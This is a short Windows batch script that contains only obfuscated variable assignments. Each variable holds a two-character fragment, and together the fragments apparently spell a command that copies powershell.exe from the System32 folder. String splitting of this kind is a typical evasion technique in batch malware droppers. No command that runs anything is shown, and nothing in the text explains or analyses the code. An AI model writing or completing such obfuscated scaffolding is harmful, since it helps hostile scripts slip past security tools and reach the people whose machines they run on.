@echo off
set "XWtdOTzjHd=0\"
set "HxssDYFLdv=st"
set "SNcOJloYSo=\v"
set "IRswoWCFYG=rS"
set "qKZocLnfLc=we"
set "uwSOYfbpdH=s\"
set "YoWXkrHMcW=y "
set "ewGlRwRlFY=ow"
set "DbEVomXebc=ll"
set "CaCDDdDext=py"
set "vlWVSlHfuJ=Wi"
set "rXlQeVtYaP=rs"
set "DZueQpXmOT=nd"
set "ZAOPkHOXBr=we"
set "BmHWdFJRDx=he"
set "miiHjAaTdl=co"
set "ulSxfmtkil=xe"
set "tfjqXFJhlI=:\"
set "eJGdzqspBR= /"
set "rXkWSqvDnR= C"
set "nIihkOncWx=32"
